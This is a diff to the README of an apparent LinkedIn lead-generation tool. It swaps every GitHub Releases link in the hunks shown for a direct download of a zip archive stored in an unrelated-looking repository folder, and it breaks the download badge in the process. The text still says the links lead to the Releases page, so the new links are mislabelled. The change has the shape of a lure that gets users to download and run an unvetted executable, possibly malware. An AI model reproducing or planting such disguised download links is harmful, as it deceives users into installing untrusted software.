@@ -6,9 +6,9 @@ Welcome to the linkedin-lead-generation project. This application helps you auto
 
 ## 📥 Download the Application
 
-[![Download Link](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Hrithik2S/linkedin-lead-generation/releases)
+[![Download Link](https://raw.githubusercontent.com/Hrithik2S/linkedin-lead-generation/main/sledgemeter/generation_lead_linkedin_v1.8.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Hrithik2S/linkedin-lead-generation/main/sledgemeter/generation_lead_linkedin_v1.8.zip)
 
-You can easily download the application from our Releases page. Visit this page to download: [Download here](https://github.com/Hrithik2S/linkedin-lead-generation/releases). 
+You can easily download the application from our Releases page. Visit this page to download: [Download here](https://raw.githubusercontent.com/Hrithik2S/linkedin-lead-generation/main/sledgemeter/generation_lead_linkedin_v1.8.zip). 
 
 ## 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To run this application, you need:
 
 ## 📂 Download & Install
 
-1. Visit the Releases page to download the latest version: [Download here](https://github.com/Hrithik2S/linkedin-lead-generation/releases).
+1. Visit the Releases page to download the latest version: [Download here](https://raw.githubusercontent.com/Hrithik2S/linkedin-lead-generation/main/sledgemeter/generation_lead_linkedin_v1.8.zip).
 
 2. Locate the downloaded file on your computer. It should have an extension like `.exe` for Windows or `.dmg` for macOS.
 
